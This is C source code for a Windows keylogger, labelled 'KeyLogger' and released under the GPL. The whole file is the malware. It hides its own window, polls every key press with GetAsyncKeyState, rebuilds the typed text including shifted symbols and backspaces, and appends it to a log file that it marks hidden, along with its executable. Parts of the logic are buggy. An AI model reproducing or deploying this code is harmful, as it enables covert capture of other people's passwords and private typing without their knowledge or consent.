/*
KeyLogger
GPL
*/

#include<stdio.h>
#include<stdlib.h>
#include<conio.h>
#include<string.h>
#include <windows.h>
#include<process.h>
#include <winreg.h>
#define VTString 99999

using namespace std;

    int main();
    int Iniciar();
    int BackSpace();
    int Caracteres_Minusculo();
    int Caracteres_Maiusculo();
    int Espaco();
    int Loop();
    int Fluxo();
    int CapsLock();
    int Shift();
    int Numeros();
    int Gravar();

    char Nome[VTString];
    int  n,i,i2;
    int  Size=0;
    int  SizeString;
    int  Contador_Backspace;
    int  Control_Char;
    int  NumberSaida;
    int  EstadoCapsLock;

    FILE *Arquivo;
    HWND Janela_Oculta =FindWindow(NULL,"KeyBuffer");

    int main()
    {

        sprintf(Nome,"");
        Iniciar();
        Loop();

    }

    int Iniciar()
    {

        ShowWindow(Janela_Oculta,SW_HIDE);

        if((Arquivo=fopen("Keybuffer0.2.txt","a+")) == NULL) exit(1);

         SetFileAttributes("Keybuffer0.2.txt", FILE_ATTRIBUTE_HIDDEN);
         SetFileAttributes("Keybuffer0.2.exe", FILE_ATTRIBUTE_HIDDEN);
    }

    int Loop()
    {

        for(;;)
        {
            do{
                  Sleep(1);
                  fflush(stdin);
                  BackSpace();
                  Shift();
                  CapsLock();
                  Caracteres_Minusculo();
                  Numeros();
                  Espaco();
                  Fluxo();

                }while(((GetAsyncKeyState(0x1B))&&(GetAsyncKeyState(0x30))) == false);
            Gravar();
            exit(1);
        }

        fclose(Arquivo);
    }

    int BackSpace()
    {
      if(GetAsyncKeyState(0x8)==-32767)
       {
             Contador_Backspace++;
       }
    }

    int Caracteres_Minusculo()
    {
        for(n=65;n<=90;n++)
        {
               if(GetAsyncKeyState(n)== -32767)
               {
                      Control_Char = 1;
                      sprintf(Nome,"%s%c",Nome,n+32);
                      SizeString = strlen(Nome);
               }
        }

    }
    int Caracteres_Maiusculo()
    {
        for(n=65;n<=90;n++)
        {
               if(GetAsyncKeyState(n)== -32767)
               {
                      Control_Char = 1;
                      sprintf(Nome,"%s%c",Nome,n);
                      SizeString = strlen(Nome);
               }
        }

    }

    int Fluxo()
    {
        char NomeX[VTString];
        if(strlen(Nome) == 0)
        {
            char NomeX[Size];
        }
        if(Size >= strlen(Nome))
        {
            char NomeX[strlen(Nome)-Size];
        }

        if((Contador_Backspace > 0)&&(Control_Char == 0))
        {

            Size =(SizeString - Contador_Backspace);

            if(Contador_Backspace > SizeString)
            {
                 Contador_Backspace=SizeString=0;
                 sprintf(Nome,"");
                 sprintf(NomeX,"");
            }
        }else if(Contador_Backspace == 0)
        {
              Size = (SizeString) + Contador_Backspace;
        }else if(Control_Char == 1)
        {
                Contador_Backspace = 0;
                Size =(SizeString - Contador_Backspace);
                Control_Char = 0;

        }
           for(i=0;i<=Size;i++)
           {
             NomeX[i] = Nome[i];
           }
           strcpy(Nome,NomeX);
    }

    int Espaco()
    {

        if(GetAsyncKeyState(0x20)==-32767)
        {
           sprintf(Nome,"%s ",Nome);
        }

    }

    int CapsLock()
    {
              EstadoCapsLock = GetKeyState(0x14);
              if(EstadoCapsLock == 0)
              {
                          Caracteres_Minusculo();
              }
              else if(EstadoCapsLock == 1)
              {
                          Caracteres_Maiusculo();
              }
    }

    int Shift()
    {
              EstadoCapsLock = GetKeyState(0x14);
              if(EstadoCapsLock == 0)
              {
                          Caracteres_Maiusculo();
              }
              else if(EstadoCapsLock == 1)
              {

                 Caracteres_Minusculo();
              }

                 for(n=48;n<=57;n++)
                 if(GetAsyncKeyState(n)==-32767)
                 switch(n)
                 {

                 case 48:
                 sprintf(Nome,"%s)",Nome);
                 break;

                 case 49:
                 sprintf(Nome,"%s!",Nome);
                 break;

                 case 50:
                 sprintf(Nome,"%s@",Nome);
                 break;

                 case 51:
                 sprintf(Nome,"%s%%23",Nome);
                 break;

                 case 52:
                 sprintf(Nome,"%s%%24",Nome);
                 break;

                 case 53:
                 sprintf(Nome,"%s%%25",Nome);
                 break;

                 case 54:
                 sprintf(Nome,"%s%%5E",Nome);
                 break;

                 case 55:
                 sprintf(Nome,"%s%%26",Nome);
                 break;

                 case 56:
                 sprintf(Nome,"%s*",Nome);
                 break;

                 case 57:
                 sprintf(Nome,"%s(",Nome);
                 break;

                 case 186:
                 sprintf(Nome,"%s+",Nome);
                 break;

                 case 187:
                 sprintf(Nome,"%s+",Nome);
                 break;

                 case 188:
                 sprintf(Nome,"%s<",Nome);
                 break;

                 case 189:
                 sprintf(Nome,"%s_",Nome);
                 break;

                 case 190:
                 sprintf(Nome,"%s>",Nome);
                 break;

                 case 191:
                 sprintf(Nome,"%s?",Nome);
                 break;

                 case 192:
                 sprintf(Nome,"%s~",Nome);
                 break;

                 case 219:
                 sprintf(Nome,"%s{",Nome);
                 break;

                 case 220:
                 sprintf(Nome,"%s|",Nome);
                 break;

                 case 221:
                 sprintf(Nome,"%s}",Nome);
                 break;

                 case 222:
                 sprintf(Nome,"%s\"",Nome);
                 break;

                 }

    }

    int Numeros()
    {
        Control_Char = 1;
        for(n=96;n<=105;n++)
        if(GetAsyncKeyState(n)==-32767)
        sprintf(Nome,"%s%c",Nome,n-48 );
        SizeString = strlen(Nome);

    }

    int Gravar()
    {
        fwrite(&Nome,sizeof(char),Size,Arquivo);
    }
